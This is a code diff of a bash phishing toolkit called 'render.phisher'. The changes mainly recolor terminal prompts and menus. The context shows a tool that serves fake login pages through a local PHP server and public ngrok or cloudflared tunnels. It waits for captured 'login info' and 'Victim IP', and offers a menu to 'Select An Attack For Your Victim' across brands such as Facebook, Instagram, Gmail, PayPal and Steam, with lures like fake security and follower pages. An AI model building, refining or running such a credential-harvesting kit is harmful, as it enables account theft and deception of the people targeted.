@@ -248,7 +248,7 @@ check_update() {
   if [[ "$new_version" != "$__version__" ]]; then
     echo -e "${ORANGE}update found${WHITE}"
     sleep 1
-    echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
+    echo -ne "\n${BRIGHT_GREEN} Downloading Update..."
 
     tmpfile=$(mktemp /tmp/render.phisher.XXXXXX.tar.gz) \
       || { echo "[!] mktemp failed"; return 1; }
@@ -256,28 +256,28 @@ check_update() {
     # download safely with retries
     if ! curl --fail --show-error --retry 3 --retry-delay 2 -L \
       -A "$ua" -o "$tmpfile" "$tarball_url"; then
-      echo -e "\n${RED}[!] Error occurred while downloading.${WHITE}"
+      echo -e "\n${RED} Error occurred while downloading.${WHITE}"
       rm -f "$tmpfile"
       return 1
     fi
 
     # ensure BASE_DIR exists
     if [ ! -d "$BASE_DIR" ] && ! mkdir -p "$BASE_DIR"; then
-      echo -e "\n${RED}[!] Cannot create BASE_DIR: $BASE_DIR${WHITE}"
+      echo -e "\n${RED} Cannot create BASE_DIR: $BASE_DIR${WHITE}"
       rm -f "$tmpfile"
       return 1
     fi
 
     # extract safely
     if ! tar -xzf "$tmpfile" -C "$BASE_DIR" --strip-components=1 >/dev/null 2>&1; then
-      echo -e "\n\n${RED}[!] Error occurred while extracting.${WHITE}"
+      echo -e "\n\n${RED} Error occurred while extracting.${WHITE}"
       rm -f "$tmpfile"
       return 1
     fi
 
     rm -f "$tmpfile"
     { sleep 1; clear; banner_small; } 2>/dev/null
-    echo -e "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated to ${new_version}! Run render.phisher again\n"
+    echo -e "\n${BRIGHT_GREEN} Successfully updated to ${new_version}! Run render.phisher again\n"
     reset_color 2>/dev/null || true
     return 0
 
@@ -491,25 +491,25 @@ about() {
 ## Choose custom port
 cusport() {
 	echo
-	read -n1 -p "${WHITE}Do You Want A Custom Port: y/N:${ORANGE}" P_ANS
+	read -n1 -p "${MAGENTA}Do You Want A Custom Port: y/N:${ORANGE}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
 		echo -e "\n"
-		read -n4 -p "{WHITE}[${WHITE}-${WHITE}]${WHITE} Enter Your Custom 4-digit Port[1024-9999]: ${WHITE}" CU_P
+		read -n4 -p "{MAGENTA} Enter Your Custom 4-digit Port[1024-9999]: ${WHITE}" CU_P
 		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
 			PORT=${CU_P}
 			echo
 		else
-			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port: $CU_P, Try Again...${WHITE}"
+			echo -ne "\n\n${RED} Invalid 4-digit Port: $CU_P, Try Again...${WHITE}"
 			{ sleep 2; clear; banner_small; cusport; }
 		fi		
 	else 
-		echo -ne "\n\n${CYAN}[${CYAN}-${CYAN}]${CYAN} Using Default Port $PORT...${WHITE}\n"
+		echo -ne "\n\n${CYAN} Using Default Port $PORT...${WHITE}\n"
 	fi
 }
 
 ## Setup website and start php server
 setup_site() {
-    echo -e "\n${WHITE}[${WHITE}-${WHITE}]${WHITE} Setting up server..."${WHITE}
+    echo -e "\n${CYAN} Setting up server..."${WHITE}
     if [ "$website" = "camera" ]; then
         cp -rf .sites/"$website"/* .server/www
         cp -f .sites/"$website"/location.php .server/www/
@@ -517,7 +517,7 @@ setup_site() {
         cp -rf .sites/"$website"/* .server/www
         cp -f .sites/ip.php .server/www/
     fi
-    echo -ne "\n${CYAN}[${CYAN}-${CYAN}]${CYAN} Successfully set up PHP server!"${WHITE}
+    echo -ne "\n${CYAN} Successfully set up PHP server!"${WHITE}
     cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
@@ -560,7 +560,7 @@ capture_creds() {
 
 ## Print data
 capture_data() {
-	echo -ne "\n${CYAN}[${CYAN}-${CYAN}]${CYAN} Awaiting login info... ${CYAN}Ctrl + C ${ORANGE}to exit..."
+	echo -ne "\n${CYAN} Awaiting login info... ${CYAN}Ctrl + C ${ORANGE}to exit..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
 			echo -e "\n\n${GREEN} Victim IP Found !"
@@ -581,9 +581,9 @@ capture_data() {
 start_cloudflared() { 
 	rm .cld.log > /dev/null 2>&1 &
 	cusport
-	echo -e "\n${WHITE}[${WHITE}-${WHITE}]${WHITE} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${ORANGE} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${CYAN}[${CYAN}-${CYAN}]${CYAN} Waiting for Cloudflare response..."
+	echo -ne "\n\n${CYAN} Waiting for Cloudflare response..."
 
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
@@ -705,13 +705,13 @@ start_ngrok() {
 tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
-		${WHITE} 0. Main Menu
-		${WHITE} 1. Localhost
-		${WHITE} 2. Ngrok.io
-		${WHITE} 3. Cloudflared
+		${CYAN} 0. Main Menu
+		${CYAN} 1. Localhost
+		${CYAN} 2. Ngrok.io
+		${CYAN} 3. Cloudflared
 	EOF
 
-	read -p "${WHITE} Select a port forwarding service or return to main menu:"
+	read -p "${MAGENTA} Select a port forwarding service or return to main menu:"
 
 	case $REPLY in 
 		0 | 00)
@@ -785,8 +785,8 @@ custom_url() {
 		processed_url="Unable to Shorten URL"
 	fi
 
-	echo -e "\n${BLUE} URL 1 : ${GREEN}$url"
-	echo -e "\n${BLUE} URL 2 : ${ORANGE}$processed_url"
+	echo -e "\n${BRIGHT_GREEN} URL 1 : ${GREEN}$url"
+	echo -e "\n${BRIGHT_GREEN} URL 2 : ${ORANGE}$processed_url"
 	[[ $processed_url != *"Unable"* ]] && echo -e "\n${BLUE} URL 3 : ${ORANGE}$masked_url"
 }
 
@@ -794,14 +794,14 @@ custom_url() {
 site_facebook() {
 	cat <<- EOF
 
-		${WHITE}1. Traditional Login Page
-		${WHITE}2. Advanced Voting Poll Login Page
-		${WHITE}3. Fake Security Login Page
-		${WHITE}4. Facebook Messenger Login Page
+		${CYAN}1. Traditional Login Page
+		${CYAN}2. Advanced Voting Poll Login Page
+		${CYAN}3. Fake Security Login Page
+		${CYAN}4. Facebook Messenger Login Page
 
 	EOF
 
-	read -p "${WHITE}Select an option:"
+	read -p "${MAGENTA}Select an option:"
 
 	case $REPLY in 
 		1 | 01)
@@ -830,14 +830,14 @@ site_facebook() {
 site_instagram() {
 	cat <<- EOF
 
-		${WHITE}1. Traditional Login Page
-		${WHITE}2. Auto Followers Login Page
-		${WHITE}3. 1000 Followers Login Page
-		${WHITE}4. Blue Badge Verify Login Page
+		${CYAN}1. Traditional Login Page
+		${CYAN}2. Auto Followers Login Page
+		${CYAN}3. 1000 Followers Login Page
+		${CYAN}4. Blue Badge Verify Login Page
 
 	EOF
 
-	read -p "${WHITE}Select an option:"
+	read -p "${MAGENTA}Select an option:"
 
 	case $REPLY in 
 		1 | 01)
@@ -866,13 +866,13 @@ site_instagram() {
 site_gmail() {
 	cat <<- EOF
 
-		${WHITE}1. Gmail Old Login Page
-		${WHITE}2. Gmail New Login Page
-		${WHITE}3. Advanced Voting Poll
+		${CYAN}1. Gmail Old Login Page
+		${CYAN}2. Gmail New Login Page
+		${CYAN}3. Advanced Voting Poll Page
 
 	EOF
 
-	read -p "${WHITE}Select an option:"
+	read -p "${MAGENTA}Select an option:"
 
 	case $REPLY in 
 		1 | 01)
@@ -899,21 +899,21 @@ main_menu() {
 	cat <<- EOF
 		${RED}Select An Attack For Your Victim:
 
-		${WHITE}01. Airbnb	${WHITE}11. Tiktok	${WHITE}21. Roblox
-		${WHITE}02. Adobe	${WHITE}12. Snapchat	${WHITE}22. Steam	
-		${WHITE}03. Facebook	${WHITE}13. Spotify	${WHITE}23. Playstation
-		${WHITE}04. Instagram	${WHITE}14. Github	${WHITE}24. Xbox
-		${WHITE}05. Google	${WHITE}15. Shopify	${WHITE}25. Verizon
-		${WHITE}06. Bitcoin	${WHITE}16. Ebay	${WHITE}26. Wifi
-		${WHITE}07. Crypto	${WHITE}17. Pinterest		
-		${WHITE}08. Microsoft	${WHITE}18. Discord		
-		${WHITE}09. Netflix	${WHITE}19. Reddit		
-		${WHITE}10. Paypal	${WHITE}20. Messenger		
+		${BRIGHT_GREEN}01. Airbnb	${BRIGHT_GREEN}11. Tiktok	${BRIGHT_GREEN}21. Roblox
+		${BRIGHT_GREEN}02. Adobe	${BRIGHT_GREEN}12. Snapchat	${BRIGHT_GREEN}22. Steam	
+		${BRIGHT_GREEN}03. Facebook	${BRIGHT_GREEN}13. Spotify	${BRIGHT_GREEN}23. Playstation
+		${BRIGHT_GREEN}04. Instagram	${BRIGHT_GREEN}14. Github	${BRIGHT_GREEN}24. Xbox
+		${BRIGHT_GREEN}05. Google	${BRIGHT_GREEN}15. Shopify	${BRIGHT_GREEN}25. Verizon
+		${BRIGHT_GREEN}06. Bitcoin	${BRIGHT_GREEN}16. Ebay	${BRIGHT_GREEN}26. Wifi
+		${BRIGHT_GREEN}07. Crypto	${BRIGHT_GREEN}17. Pinterest		
+		${BRIGHT_GREEN}08. Microsoft	${BRIGHT_GREEN}18. Discord		
+		${BRIGHT_GREEN}09. Netflix	${BRIGHT_GREEN}19. Reddit		
+		${BRIGHT_GREEN}10. Paypal	${BRIGHT_GREEN}20. Messenger		
 
-		${WHITE}99. About         ${WHITE}0. Exit
+		${BRIGHT_CYAN}99. About         ${BRIGHT_CYAN}0. Exit
 	EOF
 	
-	read -p "${WHITE}Select an option:"
+	read -p "${MAGENTA}Select an option:"
 
 	case $REPLY in 
 		1 | 01)
